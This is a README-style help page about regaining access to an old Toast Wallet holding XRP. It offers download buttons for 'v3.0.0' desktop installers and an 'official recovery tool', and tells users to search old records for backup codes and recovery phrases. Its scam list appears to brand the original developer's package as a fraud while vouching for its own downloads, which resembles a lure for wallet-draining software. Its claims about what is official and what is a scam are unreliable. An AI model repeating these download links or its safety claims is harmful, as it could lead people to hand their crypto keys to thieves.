<div align="center">

# How to Access an Old Toast Wallet You Haven't Opened in Years

**How to get back into a Toast Wallet you haven't opened in years.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Different situation from active troubleshooting: you just remembered you bought XRP years ago,
stored it in Toast Wallet, and haven't thought about it since. Here's where to start.

**First, figure out what device it was on.** If it's still on an old phone or laptop, even one
that's off and in a drawer, that's your best starting point — the app data may still be there
untouched. Power it on before doing anything else and see if the Toast Wallet app still opens with
your original PIN.

**If the device is gone, search your records instead.** The most successful recoveries we've seen
documented come from people who:
- Search old email for anything containing "toast," "backup," or a long alphanumeric string —
  many people emailed their backup code to themselves as an ad hoc save.
- Check notes apps, password managers, and any physical notebook from around when they first
  bought crypto (commonly 2017–2018 for Toast Wallet specifically).
- Check for a photo of a handwritten recovery phrase — six short made-up words, distinct from a
  password.

**Once you find something, don't guess — identify it correctly first.** People regularly confuse
the four different credential types Toast Wallet uses, which wastes time and can lock you out
further. Read [our breakdown of passphrase vs. recovery phrase vs. backup code vs. secret key]
(./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md) before entering anything.

**Then follow the standard recovery path.** Once you know what you have, our
[full recovery guide](./how-to-recover-xrp-toast-wallet.md) walks through the exact steps using
only the official recovery tool.

**One more thing worth checking:** if your wallet shows a balance but looks "wrong" or the account
seems inactive, that's very likely the XRP Ledger's minimum reserve requirement, not a lost-funds
situation — see our explainer on [why Toast Wallet says "not activated"]
(./toast-wallet-not-activated-20-xrp-reserve.md).

---

## ⚠️ Known Scams — Do Not Use These

- **The "Toast Plus" fraudulent app** (App Store / Google Play, package `co.peninsulasoftware.toastwallet`) — a lookalike app, not affiliated with Toast Wallet, that has stolen an estimated **$5M+ in XRP**. Full details: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing site** — a clone of the official recovery page that drains any wallet imported into it. Full details: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Marketing clone sites** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`. Not official, and misrepresent how Toast Wallet actually works.
- **Paid "recovery service" DMs** — always a follow-up scam; no one can reverse an XRP Ledger transaction.

See the [full Toast Wallet scam warning list](./toast-wallet-scam-warning-list.md). If you believe you've been scammed, file a report at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [Passphrase vs Recovery Phrase vs Backup Code vs Secret Key](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
- [Why Toast Wallet Says 'Not Activated'](./toast-wallet-not-activated-20-xrp-reserve.md)
